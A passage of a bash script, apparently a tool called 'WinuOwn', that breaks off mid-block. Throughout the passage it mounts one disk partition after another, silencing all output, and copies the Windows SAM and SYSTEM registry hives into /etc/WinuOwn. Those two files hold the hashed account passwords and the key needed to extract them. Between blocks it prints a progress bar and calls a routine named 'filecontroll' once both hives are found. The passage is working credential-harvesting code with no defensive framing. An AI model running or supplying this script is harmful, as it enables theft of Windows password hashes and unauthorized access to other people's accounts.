                cd /media/windows/WINDOWS/*32/*onfig
                sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                sudo umount /media/windows/ &>/dev/null  	  
                  else
                  if [ -d /media/windows/*indows/*32/*onfig/ ];
	              then
                  cd /media/windows/*indows/*32/*onfig/
                  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo umount /media/windows/ &>/dev/null		
                  else
                  sudo umount /media/windows/ &>/dev/null   
                  fi
                fi
echo -ne '======================                             44%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                    sudo mount /dev/sdb4 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
                    if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                    then
                    cd /media/windows/WINDOWS/*32/*onfig
                    sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                    sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                    sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                    sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                    sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                    sudo umount /media/windows/ &>/dev/null  	  
                      else
                      if [ -d /media/windows/*indows/*32/*onfig/ ];
	                  then
                      cd /media/windows/*indows/*32/*onfig/
                      sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                      sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                      sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                      sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                      sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                      sudo umount /media/windows/ &>/dev/null		
                      else
                      sudo umount /media/windows/ &>/dev/null   
                      fi
                    fi
echo -ne '=======================                            46%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                        sudo mount /dev/sdb5 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
                        if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                        then
                        cd /media/windows/WINDOWS/*32/*onfig
                        sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                        sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                        sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                        sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                        sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                        sudo umount /media/windows/ &>/dev/null  	  
                          else
                          if [ -d /media/windows/*indows/*32/*onfig/ ];
	                      then
                          cd /media/windows/*indows/*32/*onfig/
                          sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                          sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                          sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                          sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                          sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                          sudo umount /media/windows/ &>/dev/null		
                          else
                          sudo umount /media/windows/ &>/dev/null   
                          fi
                        fi
echo -ne '========================                           48%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                            sudo mount /dev/sdb6 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
                            if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                            then
                            cd /media/windows/WINDOWS/*32/*onfig
                            sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                            sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                            sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                            sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                            sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                            sudo umount /media/windows/ &>/dev/null  	  
                              else
                              if [ -d /media/windows/*indows/*32/*onfig/ ];
	                          then
                              cd /media/windows/*indows/*32/*onfig/
                              sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                              sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                              sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                              sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                              sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                              sudo umount /media/windows/ &>/dev/null		
                              else
                              sudo umount /media/windows/ &>/dev/null   
                              fi
                            fi
echo -ne '=========================                          50%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                                sudo mount /dev/sdb7 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
                                if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                                then
                                cd /media/windows/WINDOWS/*32/*onfig
                                sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                sudo umount /media/windows/ &>/dev/null  	  
                                  else
                                  if [ -d /media/windows/*indows/*32/*onfig/ ];
	                              then
                                  cd /media/windows/*indows/*32/*onfig/
                                  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                  sudo umount /media/windows/ &>/dev/null		
                                  else
                                  sudo umount /media/windows/ &>/dev/null   
                                  fi
                                fi
echo -ne '==========================                         52%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                                    sudo mount /dev/sdb0 /media/windows/ -t vfat -o umask=000 &>/dev/null
                                    if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                                    then
                                    cd /media/windows/WINDOWS/*32/*onfig
                                    sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                    sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                    sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                    sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                    sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                    sudo umount /media/windows/ &>/dev/null  	  
                                      else
                                      if [ -d /media/windows/*indows/*32/*onfig/ ];
	                                  then
                                      cd /media/windows/*indows/*32/*onfig/
                                      sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                      sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                      sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                      sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                      sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                      sudo umount /media/windows/ &>/dev/null		
                                      else
                                      sudo umount /media/windows/ &>/dev/null   
                                      fi
                                    fi
echo -ne '===========================                        51%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                                      sudo mount /dev/sdb0 /media/windows/ -t vfat -o umask=000 &>/dev/null
                                      if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                                      then
                                      cd /media/windows/WINDOWS/*32/*onfig
                                      sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                      sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                      sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                      sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                      sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                      sudo umount /media/windows/ &>/dev/null  	  
                                        else
                                        if [ -d /media/windows/*indows/*32/*onfig/ ];
	                                    then
                                        cd /media/windows/*indows/*32/*onfig/
                                        sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                        sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                        sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                        sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                        sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                        sudo umount /media/windows/ &>/dev/null		
                                        else
                                        sudo umount /media/windows/ &>/dev/null   
                                        fi
                                      fi
echo -ne '============================                       56%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                                        sudo mount /dev/sdb1 /media/windows/ -t vfat -o umask=000 &>/dev/null
                                        if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                                        then
                                        cd /media/windows/WINDOWS/*32/*onfig
                                        sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                        sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                        sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                        sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                        sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                        sudo umount /media/windows/ &>/dev/null  	  
                                          else
                                          if [ -d /media/windows/*indows/*32/*onfig/ ];
	                                      then
                                          cd /media/windows/*indows/*32/*onfig/
                                          sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                          sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                          sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                          sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                          sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                          sudo umount /media/windows/ &>/dev/null		
                                          else
                                          sudo umount /media/windows/ &>/dev/null   
                                          fi
                                        fi
echo -ne '=============================                      58%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                                          sudo mount /dev/sdb2 /media/windows/ -t vfat -o umask=000 &>/dev/null
                                          if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                                          then
                                          cd /media/windows/WINDOWS/*32/*onfig
                                          sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                          sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                          sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                          sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                          sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                          sudo umount /media/windows/ &>/dev/null  	  
                                            else
                                            if [ -d /media/windows/*indows/*32/*onfig/ ];
	                                        then
                                            cd /media/windows/*indows/*32/*onfig/
                                            sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                            sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                            sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                            sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                            sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                            sudo umount /media/windows/ &>/dev/null		
                                            else
                                            sudo umount /media/windows/ &>/dev/null   
                                            fi
                                          fi
echo -ne '==============================                     60%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                                            sudo mount /dev/sdb3 /media/windows/ -t vfat -o umask=000 &>/dev/null
                                            if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                                            then
                                            cd /media/windows/WINDOWS/*32/*onfig
                                            sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                            sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                            sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                            sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                            sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                            sudo umount /media/windows/ &>/dev/null  	  
                                              else
                                              if [ -d /media/windows/*indows/*32/*onfig/ ];
	                                          then
                                              cd /media/windows/*indows/*32/*onfig/
                                              sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                              sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                              sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                              sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                              sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                              sudo umount /media/windows/ &>/dev/null		
                                              else
                                              sudo umount /media/windows/ &>/dev/null   
                                              fi
                                            fi
echo -ne '===============================                    62%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                                              sudo mount /dev/sdb4 /media/windows/ -t vfat -o umask=000 &>/dev/null
                                              if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                                              then
                                              cd /media/windows/WINDOWS/*32/*onfig
                                              sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                              sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                              sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                              sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                              sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                              sudo umount /media/windows/ &>/dev/null  	  
                                                else
                                                if [ -d /media/windows/*indows/*32/*onfig/ ];
	                                            then
                                                cd /media/windows/*indows/*32/*onfig/
                                                sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                                sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                                sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                                sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                                sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                                sudo umount /media/windows/ &>/dev/null		
                                                else
                                                sudo umount /media/windows/ &>/dev/null   
                                                fi
                                              fi
echo -ne '================================                   64%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                                                sudo mount /dev/sdb5 /media/windows/ -t vfat -o umask=000 &>/dev/null
                                                if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                                                then
                                                cd /media/windows/WINDOWS/*32/*onfig
                                                sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                                sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                                sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                                sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                                sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                                sudo umount /media/windows/ &>/dev/null  	  
                                                  else
                                                  if [ -d /media/windows/*indows/*32/*onfig/ ];
	                                              then
                                                  cd /media/windows/*indows/*32/*onfig/
                                                  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                                  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                                  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                                  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                                  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                                  sudo umount /media/windows/ &>/dev/null		
                                                  else
                                                  sudo umount /media/windows/ &>/dev/null   
                                                  fi
                                                fi
echo -ne '=================================                  66%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                                                  sudo mount /dev/sdb6 /media/windows/ -t vfat -o umask=000 &>/dev/null
                                                  if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                                                  then
                                                  cd /media/windows/WINDOWS/*32/*onfig
                                                  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                                  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                                  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                                  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                                  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                                  sudo umount /media/windows/ &>/dev/null  	  
                                                    else
                                                    if [ -d /media/windows/*indows/*32/*onfig/ ];
	                                                then
                                                    cd /media/windows/*indows/*32/*onfig/
                                                    sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                                    sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                                    sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                                    sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                                    sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                                    sudo umount /media/windows/ &>/dev/null		
                                                    else
                                                    sudo umount /media/windows/ &>/dev/null   
                                                    fi
                                                  fi
echo -ne '==================================                 68%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                                                    sudo mount /dev/sdb7 /media/windows/ -t vfat -o umask=000 &>/dev/null
                                                    if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                                                    then
                                                    cd /media/windows/WINDOWS/*32/*onfig
                                                    sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                                    sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                                    sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                                    sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                                    sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                                    sudo umount /media/windows/ &>/dev/null  	  
                                                      else
                                                      if [ -d /media/windows/*indows/*32/*onfig/ ];
	                                                  then
                                                      cd /media/windows/*indows/*32/*onfig/
                                                      sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                                      sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                                      sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                                      sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                                      sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                                      sudo umount /media/windows/ &>/dev/null		
                                                      else
                                                      sudo umount /media/windows/ &>/dev/null   
                                                      fi
                                                    fi
echo -ne '===================================                70%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
sudo mount /dev/sda8 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
then
cd /media/windows/WINDOWS/*32/*onfig
sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
sudo cp sam /etc/WinuOwn/SAM &>/dev/null
sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null    
  else
  if [ -d /media/windows/*indows/*32/*onfig/ ];
  then
  cd /media/windows/*indows/*32/*onfig/
  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null 
  else
  sudo umount /media/windows/ &>/dev/null   
  fi
fi
echo -ne '====================================               72%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
        sudo mount /dev/sda9 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
        if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
        then
        cd /media/windows/WINDOWS/*32/*onfig
        sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
        sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
        sudo cp sam /etc/WinuOwn/SAM &>/dev/null
        sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
        sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
        sudo umount /media/windows/ &>/dev/null  	  
          else
          if [ -d /media/windows/*indows/*32/*onfig/ ];
	      then
          cd /media/windows/*indows/*32/*onfig/
          sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
          sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
          sudo cp sam /etc/WinuOwn/SAM &>/dev/null
          sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
          sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
          sudo umount /media/windows/ &>/dev/null		
          else
          sudo umount /media/windows/ &>/dev/null   
          fi
        fi
echo -ne '=====================================              74%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
            sudo mount /dev/sdb8 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
            if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
            then
            cd /media/windows/WINDOWS/*32/*onfig
            sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
            sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
            sudo cp sam /etc/WinuOwn/SAM &>/dev/null
            sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
            sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
            sudo umount /media/windows/ &>/dev/null  	  
              else
              if [ -d /media/windows/*indows/*32/*onfig/ ];
	          then
              cd /media/windows/*indows/*32/*onfig/
              sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
              sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
              sudo cp sam /etc/WinuOwn/SAM &>/dev/null
              sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
              sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
              sudo umount /media/windows/ &>/dev/null		
              else
              sudo umount /media/windows/ &>/dev/null   
              fi
            fi
echo -ne '======================================             76%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                sudo mount /dev/sdb9 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
                if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                then
                cd /media/windows/WINDOWS/*32/*onfig
                sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                sudo umount /media/windows/ &>/dev/null  	  
                  else
                  if [ -d /media/windows/*indows/*32/*onfig/ ];
	              then
                  cd /media/windows/*indows/*32/*onfig/
                  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo umount /media/windows/ &>/dev/null		
                  else
                  sudo umount /media/windows/ &>/dev/null   
                  fi
                fi
echo -ne '=======================================            78%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                sudo mount /dev/sdc1 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
                if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                then
                cd /media/windows/WINDOWS/*32/*onfig
                sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                sudo umount /media/windows/ &>/dev/null  	  
                  else
                  if [ -d /media/windows/*indows/*32/*onfig/ ];
	              then
                  cd /media/windows/*indows/*32/*onfig/
                  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo umount /media/windows/ &>/dev/null		
                  else
                  sudo umount /media/windows/ &>/dev/null   
                  fi
                fi
echo -ne '========================================           80%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                sudo mount /dev/sdc2 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
                if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                then
                cd /media/windows/WINDOWS/*32/*onfig
                sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                sudo umount /media/windows/ &>/dev/null  	  
                  else
                  if [ -d /media/windows/*indows/*32/*onfig/ ];
	              then
                  cd /media/windows/*indows/*32/*onfig/
                  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo umount /media/windows/ &>/dev/null		
                  else
                  sudo umount /media/windows/ &>/dev/null   
                  fi
                fi
echo -ne '=========================================          82%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                sudo mount /dev/sdc3 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
                if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                then
                cd /media/windows/WINDOWS/*32/*onfig
                sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                sudo umount /media/windows/ &>/dev/null  	  
                  else
                  if [ -d /media/windows/*indows/*32/*onfig/ ];
	              then
                  cd /media/windows/*indows/*32/*onfig/
                  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo umount /media/windows/ &>/dev/null		
                  else
                  sudo umount /media/windows/ &>/dev/null   
                  fi
                fi
echo -ne '==========================================         84%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                sudo mount /dev/sdc4 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
                if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                then
                cd /media/windows/WINDOWS/*32/*onfig
                sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                sudo umount /media/windows/ &>/dev/null  	  
                  else
                  if [ -d /media/windows/*indows/*32/*onfig/ ];
	              then
                  cd /media/windows/*indows/*32/*onfig/
                  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo umount /media/windows/ &>/dev/null		
                  else
                  sudo umount /media/windows/ &>/dev/null   
                  fi
                fi
echo -ne '===========================================        86%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                sudo mount /dev/sdc5 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
                if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                then
                cd /media/windows/WINDOWS/*32/*onfig
                sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                sudo umount /media/windows/ &>/dev/null  	  
                  else
